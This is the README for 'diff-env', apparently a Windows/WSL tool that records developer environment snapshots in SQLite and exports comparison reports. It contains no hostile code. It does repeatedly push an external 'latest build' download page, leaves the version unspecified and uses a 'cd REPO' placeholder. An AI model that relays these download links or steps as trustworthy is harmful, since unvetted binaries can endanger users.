# diff-env - Environment Snapshot and Comparison Tool 2026

> **diff-env is a developer-focused utility for Windows and WSL that captures environment snapshots, diffs machines, and builds shareable reports for the current release.**

[![Platform](https://img.shields.io/badge/Platform-Windows%20%26%20WSL-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hoffmannsam2004/diff-env-windows-snap?style=flat-square)](https://github.com/hoffmannsam2004/diff-env-windows-snap)

---

<p align="center">
  <a href="https://hoffmannsam2004.github.io/diff-env-windows-snap/">
    <img src="https://img.shields.io/badge/Download-diff--env%20Latest-brightgreen?style=for-the-badge" alt="Download diff-env">
  </a>
</p>

> **[Download - diff-env latest build](https://hoffmannsam2004.github.io/diff-env-windows-snap/)**

---

[Download Latest Build](https://hoffmannsam2004.github.io/diff-env-windows-snap/)

---

## What is diff-env?

diff-env gives you a repeatable way to document which runtimes and tooling exist on Windows hosts and under WSL. Instead of walking each box by hand, you capture structured snapshots into one place and use those records to spot what differs between setups.

It fits day-to-day stacks that involve Java, Python, Go, TypeScript, Docker, Nix, and similar tooling. Snapshots land in SQLite; from there you can export or reshape the data into HTML and CSV for local inspection, handoff to teammates, or automated publishing via GitHub Pages.

---

## What you can do

- Capture environment snapshots across more than one machine
- Place devices and dev environments next to each other for comparison
- Work from Windows PowerShell or from Bash inside WSL
- Follow Java, Python, Go, TypeScript, Docker, Nix, and related tooling
- Persist snapshot records in SQLite
- Emit device details as JSON
- Build HTML comparison tables meant for browser review
- Create CSV reports and ship them through GitHub Pages automation

---

## Installation

Get a local copy on Windows or in a WSL distro:

```bash
git clone https://github.com/hoffmannsam2004/diff-env-windows-snap.git
cd REPO
```

Read the repo guidance and scripts before you run anything. Prefer PowerShell when the target is a Windows-oriented collection path; use Bash in WSL when you need Linux-side environment data.

Once the tree is ready, run the collection path for a first snapshot, then switch to comparison and reporting to work with what was stored.

---

## Usage

A common path through the tool:

1. Start from the project in PowerShell or WSL Bash.
2. Take a snapshot on every device or environment you care about.
3. Let the SQLite-backed store hold the collected records.
4. Export a device snapshot to JSON when you need something portable.
5. Diff chosen environments to surface tool and runtime gaps.
6. Produce HTML or CSV for review.
7. Push the report with the project’s GitHub Pages workflow when you want it online.

Pipeline sketch:

```text
collect snapshot -> save to SQLite -> compare environments -> export report
```

Teams that automate can drive report generation and page deployment with GitHub Actions.

---

## Configuration

Behavior is controlled through repository settings and workflow definitions. Before you collect, check how the project expects you to set:

- PowerShell on Windows versus Bash under WSL
- Which snapshot targets and development tools are in scope
- SQLite paths and database handling
- JSON, HTML, and CSV export options
- GitHub Actions plus GitHub Pages publishing

Keep machine-specific values in the project’s configuration approach rather than hard-coding them into commands or finished reports.

---

## Requirements

- Windows when you rely on PowerShell collection
- WSL when you collect from Bash on a Linux environment
- A usable clone of this repository
- SQLite available for snapshot storage
- GitHub Actions and GitHub Pages when you turn on automated report deploy
- Enough disk space for the SQLite database and any JSON, HTML, or CSV output

Inspected environments may include tools such as Java, Python, Go, TypeScript, Docker, and Nix.

---

## FAQ

### Is both Windows and WSL supported?

Yes. The intended shells are Windows PowerShell and WSL Bash.

### Which stacks can be recorded?

Collection can cover environments that include Java, Python, Go, TypeScript, Docker, Nix, and other tools the workflow knows how to inspect.

### Where do snapshots live?

Primary storage is SQLite. Depending on the path you run, exports can also appear as JSON, HTML, or CSV.

### Can I open reports in a browser?

Yes. HTML comparison tables are supported, and GitHub Actions can publish them with GitHub Pages.

### How do I get a newer diff-env?

Fetch the latest commits or grab the newest build from the project download link, then read any revised setup or workflow notes before you snapshot again.

### Collection failed—what should I verify?

Make sure you launched the shell you meant to use, that the tools under inspection are present where expected, and that you followed the repository’s current configuration and workflow steps.

### Can several machines feed one database?

Yes—the design assumes snapshots from multiple machines can be centralized. Use a shared or synced layout that matches how your team stores and accesses the data.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
